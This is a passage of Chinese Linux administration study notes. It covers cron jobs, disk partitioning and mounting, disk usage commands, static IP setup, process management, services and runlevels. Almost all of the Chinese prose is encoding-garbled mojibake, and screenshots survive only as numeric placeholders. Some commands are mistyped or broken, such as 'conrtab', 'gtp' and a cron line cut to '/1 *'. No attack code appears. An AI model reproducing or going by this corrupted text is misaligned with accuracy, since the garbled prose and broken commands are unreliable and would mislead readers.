* * * * /home/mytask1.sh 5) æˆåŠŸ æ¡ˆä¾‹ 2ï¼šæ¯éš” 1 åˆ†é’Ÿï¼Œ å°†å½“å‰æ—¥æœŸå’Œæ—¥å†éƒ½è¿½åŠ åˆ° /home/mycal æ–‡ä»¶ä¸­1) å…ˆç¼–å†™ä¸€ä¸ªæ–‡ä»¶ /home/mytask2.sh date &gt;&gt; /tmp/mycal cal &gt;&gt; /tmp/mycal 2) ç»™ mytask1.sh ä¸€ä¸ªå¯ä»¥æ‰§è¡Œæƒé™ chmod 744 /home/mytask2.sh 3) crontab -e 4) /1 * /home/mytask2.sh 5) æˆåŠŸ æ¡ˆä¾‹ 3: æ¯å¤©å‡Œæ™¨ 2:00 å°† mysql æ•°æ®åº“ testdb ï¼Œå¤‡ä»½åˆ°æ–‡ä»¶ä¸­mydb.bakã€‚1) å…ˆç¼–å†™ä¸€ä¸ªæ–‡ä»¶ /home/mytask3.sh /usr/local/mysql/bin/mysqldump -u root -proot testdb &gt; /tmp/mydb.bak 2) ç»™ mytask3.sh ä¸€ä¸ªå¯ä»¥æ‰§è¡Œæƒé™ chmod 744 /home/mytask3.sh 3) crontab -e 4) 0 2 * * * /home/mytask3.sh 5) æˆåŠŸ crond ç›¸å…³æŒ‡ä»¤:1) conrtab â€“rï¼šç»ˆæ­¢ä»»åŠ¡è°ƒåº¦ã€‚ 2) crontab â€“lï¼šåˆ—å‡ºå½“å‰æœ‰é‚£äº›ä»»åŠ¡è°ƒåº¦ 3) service crond restart [é‡å¯ä»»åŠ¡è°ƒåº¦] Linux ç£ç›˜åˆ†åŒºã€æŒ‚è½½åˆ†åŒºåŸºç¡€çŸ¥è¯†windows ä¸‹çš„ç£ç›˜åˆ†åŒº1593951062587 åˆ†åŒºçš„æ–¹å¼ï¼š1) mbr åˆ†åŒº: 1.æœ€å¤šæ”¯æŒå››ä¸ªä¸»åˆ†åŒº 2.ç³»ç»Ÿåªèƒ½å®‰è£…åœ¨ä¸»åˆ†åŒº 3.æ‰©å±•åˆ†åŒºè¦å ä¸€ä¸ªä¸»åˆ†åŒº 4.MBR æœ€å¤§åªæ”¯æŒ 2TBï¼Œä½†æ‹¥æœ‰æœ€å¥½çš„å…¼å®¹æ€§ 2) gtp åˆ†åŒº: 1.æ”¯æŒæ— é™å¤šä¸ªä¸»åˆ†åŒºï¼ˆä½†æ“ä½œç³»ç»Ÿå¯èƒ½é™åˆ¶ï¼Œæ¯”å¦‚ windows ä¸‹æœ€å¤š 128 ä¸ªåˆ†åŒºï¼‰ 2.æœ€å¤§æ”¯æŒ 18EB çš„å¤§å®¹é‡ï¼ˆ1EB=1024 PBï¼Œ1PB=1024 TB ï¼‰ 3.windows7 64 ä½ä»¥åæ”¯æŒ windows ä¸‹çš„ç£ç›˜åˆ†åŒº1593950528566 Linux åˆ†åŒºåŸç†ä»‹ç»1)Linux æ¥è¯´æ— è®ºæœ‰å‡ ä¸ªåˆ†åŒºï¼Œåˆ†ç»™å“ªä¸€ç›®å½•ä½¿ç”¨ï¼Œå®ƒå½’æ ¹ç»“åº•å°±åªæœ‰ä¸€ä¸ªæ ¹ç›®å½•ï¼Œä¸€ä¸ªç‹¬ç«‹ä¸”å”¯ä¸€çš„æ–‡ä»¶ç»“æ„ , Linux ä¸­æ¯ä¸ªåˆ†åŒºéƒ½æ˜¯ç”¨æ¥ç»„æˆæ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚ 2)Linux é‡‡ç”¨äº†ä¸€ç§å«â€œè½½å…¥â€çš„å¤„ç†æ–¹æ³•ï¼Œå®ƒçš„æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­åŒ…å«äº†ä¸€æ•´å¥—çš„æ–‡ä»¶å’Œç›®å½•ï¼Œ ä¸”å°†ä¸€ä¸ªåˆ†åŒºå’Œä¸€ä¸ªç›®å½•è”ç³»èµ·æ¥ã€‚è¿™æ—¶è¦è½½å…¥çš„ä¸€ä¸ªåˆ†åŒºå°†ä½¿å®ƒçš„å­˜å‚¨ç©ºé—´åœ¨ä¸€ä¸ªç›®å½•ä¸‹è·å¾—ã€‚ 1593950575312 ç¡¬ç›˜è¯´æ˜1)Linux ç¡¬ç›˜åˆ† IDE ç¡¬ç›˜å’Œ SCSI ç¡¬ç›˜ï¼Œç›®å‰åŸºæœ¬ä¸Šæ˜¯ SCSI ç¡¬ç›˜ 2)å¯¹äº IDE ç¡¬ç›˜ï¼Œé©±åŠ¨å™¨æ ‡è¯†ç¬¦ä¸ºâ€œhdx~â€,å…¶ä¸­â€œhdâ€è¡¨æ˜åˆ†åŒºæ‰€åœ¨è®¾å¤‡çš„ç±»å‹ï¼Œè¿™é‡Œæ˜¯æŒ‡ IDE ç¡¬ç›˜äº†ã€‚â€œxâ€ä¸ºç›˜å·ï¼ˆa ä¸ºåŸºæœ¬ç›˜ï¼Œb ä¸ºåŸºæœ¬ä»å±ç›˜ï¼Œc ä¸ºè¾…åŠ©ä¸»ç›˜ï¼Œd ä¸ºè¾…åŠ©ä»å±ç›˜ï¼‰,â€œ~â€ä»£è¡¨åˆ†åŒºï¼Œå‰å››ä¸ªåˆ†åŒºç”¨æ•°å­— 1 åˆ° 4 è¡¨ç¤ºï¼Œå®ƒä»¬æ˜¯ä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒºï¼Œä» 5 å¼€å§‹å°±æ˜¯é€»è¾‘åˆ†åŒºã€‚ä¾‹ï¼Œhda3 è¡¨ç¤ºä¸ºç¬¬ä¸€ä¸ª IDE ç¡¬ç›˜ä¸Šçš„ç¬¬ä¸‰ä¸ªä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒº,hdb2 è¡¨ç¤ºä¸ºç¬¬äºŒä¸ª IDE ç¡¬ç›˜ä¸Šçš„ç¬¬äºŒä¸ªä¸»åˆ†åŒºæˆ–æ‰©å±•åˆ†åŒºã€‚ 3)å¯¹äº SCSI ç¡¬ç›˜åˆ™æ ‡è¯†ä¸ºâ€œsdx~â€ï¼ŒSCSI ç¡¬ç›˜æ˜¯ç”¨â€œsdâ€æ¥è¡¨ç¤ºåˆ†åŒºæ‰€åœ¨è®¾å¤‡çš„ç±»å‹çš„ï¼Œå…¶ä½™åˆ™å’Œ IDE ç¡¬ç›˜çš„è¡¨ç¤ºæ–¹æ³•ä¸€æ · . ä½¿ç”¨ lsblk æŒ‡ä»¤æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„åˆ†åŒºæƒ…å†µ1593950651437 1593950681315 æŒ‚è½½çš„ç»å…¸æ¡ˆä¾‹éœ€æ±‚æ˜¯ç»™æˆ‘ä»¬çš„ Linux ç³»ç»Ÿå¢åŠ ä¸€ä¸ªæ–°çš„ç¡¬ç›˜ï¼Œå¹¶ä¸”æŒ‚è½½åˆ°/home/newdisk 1593950721662 å¦‚ä½•å¢åŠ ä¸€å—ç¡¬ç›˜1)è™šæ‹Ÿæœºæ·»åŠ ç¡¬ç›˜ 2)åˆ†åŒº fdisk /dev/sdb 3)æ ¼å¼åŒ– mkfs -t ext4 /dev/sdb1 4)æŒ‚è½½ å…ˆåˆ›å»ºä¸€ä¸ª /home/newdisk , æŒ‚ è½½ mount /dev/sdb1 /home/newdisk 5)è®¾ç½®å¯ä»¥è‡ªåŠ¨æŒ‚è½½(æ°¸ä¹…æŒ‚è½½ï¼Œå½“ä½ é‡å¯ç³»ç»Ÿï¼Œä»ç„¶å¯ä»¥æŒ‚è½½åˆ° /home/newdisk) ã€‚ vim /etc/fstab /dev/sdb1 /home/newdisk ext4 defaults 0 0 å…·ä½“çš„æ“ä½œæ­¥éª¤æ•´ç†è™šæ‹Ÿæœºå¢åŠ ç¡¬ç›˜æ­¥éª¤ 1åœ¨ã€è™šæ‹Ÿæœºã€‘èœå•ä¸­ï¼Œé€‰æ‹©ã€è®¾ç½®ã€‘ï¼Œç„¶åè®¾å¤‡åˆ—è¡¨é‡Œæ·»åŠ ç¡¬ç›˜ï¼Œç„¶åä¸€è·¯ã€ä¸‹ä¸€æ­¥ã€‘ï¼Œä¸­é—´åªæœ‰é€‰æ‹©ç£ç›˜å¤§å°çš„åœ°æ–¹éœ€è¦ä¿®æ”¹ï¼Œè‡³åˆ°å®Œæˆã€‚ç„¶åé‡å¯ç³»ç»Ÿï¼ˆæ‰èƒ½è¯†åˆ«ï¼‰ï¼ 1593953351911 1593953412730 1593953444288 1593953468858 1593953495297 é‡å¯è™šæ‹Ÿæœºreboot é‡å¯åä½¿ç”¨ lsblk -f å¯ä»¥çœ‹è§å¤šäº†ä¸ªsdb è™šæ‹Ÿæœºå¢åŠ ç¡¬ç›˜æ­¥éª¤ 2ä½¿ç”¨åˆ†åŒºå‘½ä»¤ fdisk /dev/sdb å¼€å§‹å¯¹/sdb åˆ†åŒº è¾“å…¥må¯ä»¥çœ‹åˆ°å¸®åŠ© m æ˜¾ç¤ºå‘½ä»¤åˆ—è¡¨ p æ˜¾ç¤ºç£ç›˜åˆ†åŒº åŒ fdisk â€“l n æ–°å¢åˆ†åŒº d åˆ é™¤åˆ†åŒº w å†™å…¥å¹¶é€€å‡º è¾“å…¥n æ˜¾ç¤º e extended p primary partition(1-4) é€‰æ‹©p è¯´æ˜ï¼š å¼€å§‹åˆ†åŒºåè¾“å…¥ nï¼Œæ–°å¢åˆ†åŒºï¼Œç„¶åé€‰æ‹© p ï¼Œåˆ†åŒºç±»å‹ä¸ºä¸»åˆ†åŒºã€‚ä¸¤æ¬¡å›è½¦é»˜è®¤å‰©ä½™å…¨éƒ¨ç©ºé—´ã€‚æœ€åè¾“å…¥ w å†™å…¥åˆ†åŒºå¹¶é€€å‡ºï¼Œè‹¥ä¸ä¿å­˜é€€å‡ºè¾“å…¥ qã€‚ img è™šæ‹Ÿæœºå¢åŠ ç¡¬ç›˜æ­¥éª¤ 3æ ¼å¼åŒ–ç£ç›˜ åˆ†åŒºå‘½ä»¤: mkfs -t ext4 /dev/sdb1 å…¶ä¸­ ext4 æ˜¯åˆ†åŒºç±»å‹ è™šæ‹Ÿæœºå¢åŠ ç¡¬ç›˜æ­¥éª¤ 4æŒ‚è½½: å°†ä¸€ä¸ªåˆ†åŒºä¸ä¸€ä¸ªç›®å½•è”ç³»èµ·æ¥ï¼Œ â€¢mount è®¾å¤‡åç§° æŒ‚è½½ç›®å½• â€¢ä¾‹å¦‚ï¼š mount /dev/sdb1 /home/newdisk â€¢umount è®¾å¤‡åç§° æˆ–è€… æŒ‚è½½ç›®å½• â€¢ä¾‹å¦‚ï¼š umount /dev/sdb1 æˆ–è€… umount /newdisk è™šæ‹Ÿæœºå¢åŠ ç¡¬ç›˜æ­¥éª¤ 5vim /etc/fstab åœ¨UUIDä¸Šé¢ä¸€è¡Œæ’å…¥ /dev/sdb1 /home/newdisk ext4 defaults 0 0 è¿™å¥è¯å¯ä»¥ä½¿å¼€æœºåèƒ½è‡ªåŠ¨æŒ‚è½½ ä½¿ç”¨å‘½ä»¤mount -aç«‹å³ç”Ÿæ•ˆ æ°¸ä¹…æŒ‚è½½é€šè¿‡ä¿®æ”¹å®ç°æŒ‚è½½æ·»åŠ å®Œæˆå æ‰§è¡Œ â€“å³åˆ»ç”Ÿæ•ˆ 1593950964217 ç£ç›˜æƒ…å†µæŸ¥è¯¢æŸ¥è¯¢ç³»ç»Ÿæ•´ä½“ç£ç›˜ä½¿ç”¨æƒ…å†µdf -h 1594016323677 æŸ¥è¯¢æŒ‡å®šç›®å½•çš„ç£ç›˜å ç”¨æƒ…å†µdu -h /ç›®å½• æŸ¥è¯¢æŒ‡å®šç›®å½•çš„ç£ç›˜å ç”¨æƒ…å†µï¼Œé»˜è®¤ä¸ºå½“å‰ç›®å½• -s æŒ‡å®šç›®å½•å ç”¨å¤§å°æ±‡æ€» -h å¸¦è®¡é‡å•ä½ -a å«æ–‡ä»¶ --max-depth=1 å­ç›®å½•æ·±åº¦ -c åˆ—å‡ºæ˜ç»†çš„åŒæ—¶ï¼Œå¢åŠ æ±‡æ€»å€¼ æŸ¥è¯¢ /opt ç›®å½•çš„ç£ç›˜å ç”¨æƒ…å†µï¼Œæ·±åº¦ä¸º 11594016421875 ç£ç›˜æƒ…å†µ-å·¥ä½œå®ç”¨æŒ‡ä»¤1) ç»Ÿè®¡/home æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•° ^- è¡¨ç¤ºä»¥&quot;-&quot;æ‰“å¤´çš„ï¼Œè¡¨ç¤ºæ–‡ä»¶ 1594016824199 2) ç»Ÿè®¡/home æ–‡ä»¶å¤¹ä¸‹ç›®å½•çš„ä¸ªæ•° 1594016885378 3)ç»Ÿè®¡è®¡/home æ–‡ä»¶å¤¹ä¸‹æ–‡ä»¶çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬å­æ–‡ä»¶å¤¹é‡Œçš„ 1594016923222 4) ç»Ÿè®¡æ–‡ä»¶å¤¹ä¸‹ç›®å½•çš„ä¸ªæ•°ï¼ŒåŒ…æ‹¬å­æ–‡ä»¶å¤¹é‡Œçš„ 1594016946230 5)ä»¥æ ‘çŠ¶æ˜¾ç¤ºç›®å½•ç»“æ„ 1594016968695 1594017008507 ç½‘ç»œé…ç½®Linux ç½‘ç»œé…ç½®åŸç†å›¾(å«è™šæ‹Ÿæœº) ç›®å‰æˆ‘ä»¬çš„ç½‘ç»œé…ç½®é‡‡ç”¨çš„æ˜¯ NATã€‚ 1594018740806 æŸ¥çœ‹ç½‘ç»œ IP å’Œç½‘å…³æŸ¥çœ‹è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ 1594018794841 ä¿®æ”¹ ip åœ°å€(ä¿®æ”¹è™šæ‹Ÿç½‘ç»œçš„ ip)1594018819402 æŸ¥çœ‹ç½‘å…³1594018857189 æŸ¥çœ‹ windows ç¯å¢ƒçš„ä¸­ VMnet8 ç½‘ç»œé…ç½® (ipconfig æŒ‡ä»¤)1) ä½¿ç”¨ ipconfig æŸ¥çœ‹ 2) ç•Œé¢æŸ¥çœ‹ 1594018892385 ping æµ‹è¯•ä¸»æœºä¹‹é—´ç½‘ç»œè¿é€šping ç›®çš„ä¸»æœº ï¼ˆåŠŸèƒ½æè¿°ï¼šæµ‹è¯•å½“å‰æœåŠ¡å™¨æ˜¯å¦å¯ä»¥è¿æ¥ç›®çš„ä¸»æœºï¼‰ æµ‹è¯•å½“å‰æœåŠ¡å™¨æ˜¯å¦å¯ä»¥è¿æ¥ç™¾åº¦ [root@hadoop100 æ¡Œé¢]# ping www.baidu.com linux ç½‘ç»œç¯å¢ƒé…ç½®ç¬¬ä¸€ç§æ–¹æ³•(è‡ªåŠ¨è·å–) 1594018974152 ç¼ºç‚¹: linux å¯åŠ¨åä¼šè‡ªåŠ¨è·å– IP,ç¼ºç‚¹æ˜¯æ¯æ¬¡è‡ªåŠ¨è·å–çš„ ip åœ°å€å¯èƒ½ä¸ä¸€æ ·ã€‚è¿™ä¸ªä¸é€‚ç”¨äºåšæœåŠ¡å™¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„æœåŠ¡å™¨çš„ ip éœ€è¦æ—¶å›ºå®šçš„ã€‚ ç¬¬äºŒç§æ–¹æ³•(æŒ‡å®šå›ºå®šçš„ ip) ç›´ æ¥ ä¿® æ”¹ é… ç½® æ–‡ ä»¶ æ¥ æŒ‡ å®š IP, å¹¶ å¯ ä»¥ è¿ æ¥ åˆ° å¤– ç½‘ ( ç¨‹ åº å‘˜ æ¨ è ) ï¼Œ ç¼– è¾‘ vi /etc/sysconfig/network-scripts/ifcfg-eth0 è¦æ±‚ï¼šå°† ip åœ°å€é…ç½®çš„é™æ€çš„ï¼Œip åœ°å€ä¸º 192.168.184.130 1594019066944 ä¿®æ”¹åï¼Œä¸€å®šè¦ é‡å¯æœåŠ¡ 1) service network restart 2) reboot é‡å¯ç³»ç»Ÿ 1594019131820 è¿›ç¨‹ç®¡ç†è¿›ç¨‹çš„åŸºæœ¬ä»‹ç» 1)åœ¨ LINUX ä¸­ï¼Œæ¯ä¸ªæ‰§è¡Œçš„ç¨‹åºï¼ˆä»£ç ï¼‰éƒ½ç§°ä¸ºä¸€ä¸ªè¿›ç¨‹ã€‚æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½åˆ†é…ä¸€ä¸ª ID å·ã€‚ 2)æ¯ä¸€ä¸ªè¿›ç¨‹ï¼Œéƒ½ä¼šå¯¹åº”ä¸€ä¸ªçˆ¶è¿›ç¨‹ï¼Œè€Œè¿™ä¸ªçˆ¶è¿›ç¨‹å¯ä»¥å¤åˆ¶å¤šä¸ªå­è¿›ç¨‹ã€‚ä¾‹å¦‚ www æœåŠ¡å™¨ã€‚ 3)æ¯ä¸ªè¿›ç¨‹éƒ½å¯èƒ½ä»¥ä¸¤ç§æ–¹å¼å­˜åœ¨çš„ã€‚å‰å°ä¸åå°ï¼Œæ‰€è°“å‰å°è¿›ç¨‹å°±æ˜¯ç”¨æˆ·ç›®å‰çš„å±å¹•ä¸Šå¯ä»¥è¿›è¡Œæ“ä½œçš„ã€‚åå°è¿›ç¨‹åˆ™æ˜¯å®é™…åœ¨æ“ä½œï¼Œä½†ç”±äºå±å¹•ä¸Šæ— æ³•çœ‹åˆ°çš„è¿›ç¨‹ï¼Œé€šå¸¸ä½¿ç”¨åå°æ–¹å¼æ‰§è¡Œã€‚ 4)ä¸€èˆ¬ç³»ç»Ÿçš„æœåŠ¡éƒ½æ˜¯ä»¥åå°è¿›ç¨‹çš„æ–¹å¼å­˜åœ¨ï¼Œè€Œä¸”éƒ½ä¼šå¸¸é©»åœ¨ç³»ç»Ÿä¸­ã€‚ç›´åˆ°å…³æœºæ‰æ‰ç»“æŸã€‚ æ˜¾ç¤ºç³»ç»Ÿæ‰§è¡Œçš„è¿›ç¨‹æŸ¥çœ‹è¿›è¡Œä½¿ç”¨çš„æŒ‡ä»¤æ˜¯ ps ,ä¸€èˆ¬æ¥è¯´ä½¿ç”¨çš„å‚æ•°æ˜¯ ps -aux 1594038649910 1594038680528 ps æŒ‡ä»¤è¯¦è§£1)æŒ‡ä»¤ï¼šps â€“aux|grep xxx ï¼Œæ¯”å¦‚æˆ‘çœ‹çœ‹æœ‰æ²¡æœ‰ sshd æœåŠ¡ æŒ‡ä»¤è¯´æ˜ â€¢ System V å±•ç¤ºé£æ ¼ â€¢ USERï¼šç”¨æˆ·åç§° â€¢ PIDï¼šè¿›ç¨‹å· â€¢ %CPUï¼šè¿›ç¨‹å ç”¨ CPU çš„ç™¾åˆ†æ¯” â€¢ %MEMï¼šè¿›ç¨‹å ç”¨ç‰©ç†å†…å­˜çš„ç™¾åˆ†æ¯” â€¢ VSZï¼šè¿›ç¨‹å ç”¨çš„è™šæ‹Ÿå†…å­˜å¤§å°ï¼ˆå•ä½ï¼šKBï¼‰ â€¢ RSSï¼šè¿›ç¨‹å ç”¨çš„ç‰©ç†å†…å­˜å¤§å°ï¼ˆå•ä½ï¼šKBï¼‰ â€¢ TTï¼šç»ˆç«¯åç§°,ç¼©å†™ . â€¢ STATï¼šè¿›ç¨‹çŠ¶æ€ï¼Œå…¶ä¸­ S-ç¡çœ ï¼Œs-è¡¨ç¤ºè¯¥è¿›ç¨‹æ˜¯ä¼šè¯çš„å…ˆå¯¼è¿›ç¨‹ï¼ŒN-è¡¨ç¤ºè¿›ç¨‹æ‹¥æœ‰æ¯”æ™®é€šä¼˜å…ˆçº§æ›´ä½çš„ä¼˜å…ˆçº§ï¼ŒR-æ­£åœ¨è¿è¡Œï¼ŒD-çŸ­æœŸç­‰å¾…ï¼ŒZ-åƒµæ­»è¿›ç¨‹ï¼ŒT-è¢«è·Ÿè¸ªæˆ–è€…è¢«åœæ­¢ç­‰ç­‰ â€¢ STARTEDï¼šè¿›ç¨‹çš„å¯åŠ¨æ—¶é—´ â€¢ TIMEï¼šCPU æ—¶é—´ï¼Œå³è¿›ç¨‹ä½¿ç”¨ CPU çš„æ€»æ—¶é—´ â€¢ COMMANDï¼šå¯åŠ¨è¿›ç¨‹æ‰€ç”¨çš„å‘½ä»¤å’Œå‚æ•°ï¼Œå¦‚æœè¿‡é•¿ä¼šè¢«æˆªæ–­æ˜¾ç¤º è¦æ±‚ï¼šä»¥å…¨æ ¼å¼æ˜¾ç¤ºå½“å‰æ‰€æœ‰çš„è¿›ç¨‹ï¼ŒæŸ¥çœ‹è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ã€‚ 1594038857538 â€¢ ps -ef æ˜¯ä»¥å…¨æ ¼å¼æ˜¾ç¤ºå½“å‰æ‰€æœ‰çš„è¿›ç¨‹ â€¢ -e æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ã€‚-f å…¨æ ¼å¼ã€‚ â€‹ â€¢ ps -ef|grep xxx â€‹ â€¢ æ˜¯ BSD é£æ ¼ â€‹ â€¢ UIDï¼šç”¨æˆ· ID â€‹ â€¢ PIDï¼šè¿›ç¨‹ ID â€‹ â€¢ PPIDï¼šçˆ¶è¿›ç¨‹ ID â€‹ â€¢ Cï¼šCPU ç”¨äºè®¡ç®—æ‰§è¡Œä¼˜å…ˆçº§çš„å› å­ã€‚æ•°å€¼è¶Šå¤§ï¼Œè¡¨æ˜è¿›ç¨‹æ˜¯ CPU å¯†é›†å‹è¿ç®—ï¼Œæ‰§è¡Œä¼˜å…ˆçº§ä¼šé™ä½ï¼›æ•°å€¼è¶Šå°ï¼Œè¡¨æ˜è¿›ç¨‹æ˜¯ I/O å¯†é›†å‹è¿ç®—ï¼Œæ‰§è¡Œä¼˜å…ˆçº§ä¼šæé«˜ â€‹ â€¢ STIMEï¼šè¿›ç¨‹å¯åŠ¨çš„æ—¶é—´ â€‹ â€¢ TTYï¼šå®Œæ•´çš„ç»ˆç«¯åç§° â€‹ â€¢ TIMEï¼šCPU æ—¶é—´ â€‹ â€¢ CMDï¼šå¯åŠ¨è¿›ç¨‹æ‰€ç”¨çš„å‘½ä»¤å’Œå‚æ•° å¦‚æœæˆ‘ä»¬å¸Œæœ›æŸ¥çœ‹ sshd è¿›ç¨‹çš„çˆ¶è¿›ç¨‹å·æ˜¯å¤šå°‘ï¼Œåº”è¯¥æ€æ ·æŸ¥è¯¢ ï¼Ÿ 1594038908719 å¯ä»¥çœ‹åˆ°æ˜¯1. ç»ˆæ­¢è¿›ç¨‹ kill å’Œ killallè‹¥æ˜¯æŸä¸ªè¿›ç¨‹æ‰§è¡Œä¸€åŠéœ€è¦åœæ­¢æ—¶ï¼Œæˆ–æ˜¯å·²æ¶ˆäº†å¾ˆå¤§çš„ç³»ç»Ÿèµ„æºæ—¶ï¼Œæ­¤æ—¶å¯ä»¥è€ƒè™‘åœæ­¢è¯¥è¿›ç¨‹ã€‚ä½¿ç”¨ kill å‘½ä»¤æ¥å®Œæˆæ­¤é¡¹ä»»åŠ¡ã€‚ kill [é€‰é¡¹] è¿›ç¨‹å·ï¼ˆåŠŸèƒ½æè¿°ï¼šé€šè¿‡è¿›ç¨‹å·æ€æ­»è¿›ç¨‹ï¼‰ killall è¿›ç¨‹åç§°ï¼ˆåŠŸèƒ½æè¿°ï¼šé€šè¿‡è¿›ç¨‹åç§°æ€æ­»è¿›ç¨‹ï¼Œä¹Ÿæ”¯æŒé€šé…ç¬¦ï¼Œè¿™åœ¨ç³»ç»Ÿå› è´Ÿè½½è¿‡å¤§è€Œå˜å¾—å¾ˆæ…¢æ—¶å¾ˆæœ‰ç”¨ï¼‰ é€‰é¡¹: -9 :è¡¨ç¤ºå¼ºè¿«è¿›ç¨‹ç«‹å³åœæ­¢ è¸¢æ‰æŸä¸ªéæ³•ç™»å½•ç”¨æˆ· xshellç”¨jackç™»å½• 1594039007134 ç»ˆæ­¢è¿œç¨‹ç™»å½•æœåŠ¡ sshd, åœ¨é€‚å½“æ—¶å€™å†æ¬¡é‡å¯ sshd æœåŠ¡ 1594039036135 ç»ˆæ­¢å¤šä¸ª gedit ç¼–è¾‘å™¨ ã€killall , é€šè¿‡è¿›ç¨‹åç§°æ¥ç»ˆæ­¢è¿›ç¨‹ã€‘ 1594039077859 å¼ºåˆ¶æ€æ‰ä¸€ä¸ªç»ˆç«¯ 1594039104006 æŸ¥çœ‹è¿›ç¨‹æ ‘ pstreepstree [é€‰é¡¹] ,å¯ä»¥æ›´åŠ ç›´è§‚çš„æ¥çœ‹è¿›ç¨‹ä¿¡æ¯ -p :æ˜¾ç¤ºè¿›ç¨‹çš„ PID -u :æ˜¾ç¤ºè¿›ç¨‹çš„æ‰€å±ç”¨æˆ· æ ‘çŠ¶çš„å½¢å¼æ˜¾ç¤ºè¿›ç¨‹çš„ pid 1594039184688 æ ‘çŠ¶çš„å½¢å¼è¿›ç¨‹çš„ç”¨æˆ· id pstree -u å³å¯ã€‚ æœåŠ¡(Service)ç®¡ç†æœåŠ¡(service) æœ¬è´¨å°±æ˜¯è¿›ç¨‹ï¼Œä½†æ˜¯æ˜¯è¿è¡Œåœ¨åå°çš„ï¼Œé€šå¸¸éƒ½ä¼šç›‘å¬æŸä¸ªç«¯å£ï¼Œç­‰å¾…å…¶å®ƒç¨‹åºçš„è¯·æ±‚ï¼Œæ¯”å¦‚(mysql , sshd é˜²ç«å¢™ç­‰)ï¼Œå› æ­¤æˆ‘ä»¬åˆç§°ä¸ºå®ˆæŠ¤è¿›ç¨‹ï¼Œæ˜¯ Linux ä¸­éå¸¸é‡è¦çš„çŸ¥è¯†ç‚¹ã€‚ åœ¨ CentOS7.0 å ä¸å†ä½¿ç”¨ service ,è€Œæ˜¯ systemctl 1594039258444 service ç®¡ç†æŒ‡ä»¤ï¼šservice æœåŠ¡å [start | stop | restart | reload | status] æŸ¥çœ‹å½“å‰é˜²ç«å¢™çš„çŠ¶å†µï¼Œå…³é—­é˜²ç«å¢™å’Œé‡å¯é˜²ç«å¢™ã€‚ 1594039305238 1594039336933 CentOSç”¨firewalld: systemctl status firewalld 1) å…³é—­æˆ–è€…å¯ç”¨é˜²ç«å¢™åï¼Œç«‹å³ç”Ÿæ•ˆã€‚[telnet æµ‹è¯• æŸä¸ªç«¯å£å³å¯] åœ¨windowä¸‹ telnetä¸æ˜¯å‘½ä»¤çš„ï¼Œæ˜¯å› ä¸ºæ²¡æœ‰telnetå®¢æˆ·ç«¯ 1594039381169 2)è¿™ç§æ–¹å¼åªæ˜¯ä¸´æ—¶ç”Ÿæ•ˆï¼Œå½“é‡å¯ç³»ç»Ÿåï¼Œè¿˜æ˜¯å›å½’ä»¥å‰å¯¹æœåŠ¡çš„è®¾ç½®ã€‚ å¦‚æœå¸Œæœ›è®¾ç½®æŸä¸ªæœåŠ¡è‡ªå¯åŠ¨æˆ–å…³é—­æ°¸ä¹…ç”Ÿæ•ˆï¼Œè¦ä½¿ç”¨ chkconfig æŒ‡ä»¤ æŸ¥çœ‹æœåŠ¡å:æ–¹å¼ 1ï¼šä½¿ç”¨ setup -&gt; ç³»ç»ŸæœåŠ¡ å°±å¯ä»¥çœ‹åˆ°ã€‚(ç©ºæ ¼é€‰ä¸­ï¼Œå›è½¦ç¡®è®¤ï¼Œtabåˆ‡æ¢) 1594039460191 æ–¹å¼ 2: /etc/init.d/æœåŠ¡åç§° 1594039571261 æœåŠ¡çš„è¿è¡Œçº§åˆ«(runlevel):æŸ¥çœ‹æˆ–è€…ä¿®æ”¹é»˜è®¤çº§åˆ«ï¼š vi /etc/inittab Linux ç³»ç»Ÿæœ‰ 7 ç§è¿è¡Œçº§åˆ«(runlevel)ï¼šå¸¸ç”¨çš„æ˜¯çº§åˆ« 3 å’Œ 5 â€¢ è¿è¡Œçº§åˆ« 0ï¼šç³»ç»ŸåœæœºçŠ¶æ€ï¼Œç³»ç»Ÿé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º 0ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨ â€¢ è¿è¡Œçº§åˆ« 1ï¼šå•ç”¨æˆ·å·¥ä½œçŠ¶æ€ï¼Œroot æƒé™ï¼Œç”¨äºç³»ç»Ÿç»´æŠ¤ï¼Œç¦æ­¢è¿œç¨‹ç™»é™† â€¢ è¿è¡Œçº§åˆ« 2ï¼šå¤šç”¨æˆ·çŠ¶æ€(æ²¡æœ‰ NFS)ï¼Œä¸æ”¯æŒç½‘ç»œ â€¢ è¿è¡Œçº§åˆ« 3ï¼šå®Œå…¨çš„å¤šç”¨æˆ·çŠ¶æ€(æœ‰ NFS)ï¼Œç™»é™†åè¿›å…¥æ§åˆ¶å°å‘½ä»¤è¡Œæ¨¡å¼ â€¢ è¿è¡Œçº§åˆ« 4ï¼šç³»ç»Ÿæœªä½¿ç”¨ï¼Œä¿ç•™ â€¢ è¿è¡Œçº§åˆ« 5ï¼šX11 æ§åˆ¶å°ï¼Œç™»é™†åè¿›å…¥å›¾å½¢ GUI æ¨¡å¼ â€¢ è¿è¡Œçº§åˆ« 6ï¼šç³»ç»Ÿæ­£å¸¸å…³é—­å¹¶é‡å¯ï¼Œé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º 6ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨ å¼€æœºçš„æµç¨‹è¯´æ˜1594039668145 å¼€æœºã€BIOSè‡ªæ£€ã€bootå¼•å¯¼ã€initè¿›ç¨‹ã€åˆ¤æ–­è¿è¡Œçº§åˆ«ã€ chkconfig æŒ‡ä»¤é€šè¿‡ chkconfig å‘½ä»¤å¯ä»¥ç»™æ¯ä¸ªæœåŠ¡çš„å„ä¸ªè¿è¡Œçº§åˆ«è®¾ç½®è‡ªå¯åŠ¨/å…³é—­ æŸ¥çœ‹æœåŠ¡ chkconfig --list|grep xxx 1594039757144 